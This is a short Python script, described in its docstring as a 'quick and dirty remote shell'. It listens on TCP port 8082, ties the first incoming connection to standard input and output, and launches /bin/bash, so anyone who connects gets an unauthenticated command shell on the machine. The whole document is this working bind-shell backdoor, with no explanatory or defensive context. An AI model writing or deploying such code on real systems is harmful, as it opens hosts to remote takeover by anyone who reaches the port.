'''
quick and dirty remote shell using sockets and file descriptors
'''
import socket
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(('',8082))

s.listen(1)

conn,__=s.accept()

os.dup2(conn.fileno(),0)
os.dup2(conn.fileno(),1)

#print("asdf")
os.system('/bin/bash')
	
conn.close()
